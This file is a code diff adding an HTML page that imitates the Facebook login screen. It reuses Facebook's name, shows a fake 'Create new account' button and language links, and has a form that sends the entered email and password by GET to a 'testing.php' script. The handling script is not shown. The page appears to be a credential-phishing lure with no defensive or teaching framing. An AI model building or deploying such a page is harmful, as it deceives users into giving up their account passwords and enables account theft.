@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login to Facebook</title>
+</head>
+<style type="text/css">
+	body
+    {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background-color: black;
+        background-image: url("");
+        font-family: sans-serif;
+    }
+.fb{
+	text-align: center;
+	color: gray;
+}
+.int,.lang{
+    font-size: 17px;
+}
+form
+    {
+        width: 500px;
+        border: 2px solid #acc;
+        padding: 30px;
+        border-radius: 15px;
+        background-color: white;
+    }
+input{
+    background-color: whitesmoke;
+    border-radius: 5px;
+    height: 40px;
+    width: 100%;
+}
+button{
+    color:white;
+    background-color:blue;
+    border-radius: 5px;
+    height: 40px;
+    width: 100%;
+    border: none;
+    overflow: hidden;
+    font-size: 20px;
+}
+::placeholder{
+	color: maroon;
+}
+.newacc{
+    color:white;
+    background-color: green;
+    text-align: center;
+    width: 40%;
+    height: 35px;
+    font-size: 20px;
+}
+</style>
+<body>
+	<form action="testing.php" method="get">
+        <p class="fb">Facebook<p>
+        <hr>
+  	 	<p class="int">Mobile number or email</p>
+        <input type="email" class="user" id="user" name="user" autocomplete="off" required>
+        <p class="int">Password</p>
+        <input type="password" class="pass" id="pass" name="pass" autocomplete="off" required><br><br>
+        <button type="submit">Log in</button><br><br>
+        <p class="int"><a href="testing.php">Forgot password?</a></p><br>
+        <hr style="width:44%;float:left;margin:10px;">or<hr style="width:43%;float:right;margin:10px;"><br><br><br>
+        <center><div class="newacc">Create new account</div></center><br><br>
+        <div class="lang">
+            English (US) <br><br>
+            <a href="#"> Filipino</a><br><br>
+            <a href="#"> Bisaya</a><br><br>
+            <a href="#"> Filipino</a><br><br>
+            <a href="#">More languages...</a>
+        </div>
+  	</form>
+</body>
+</html>
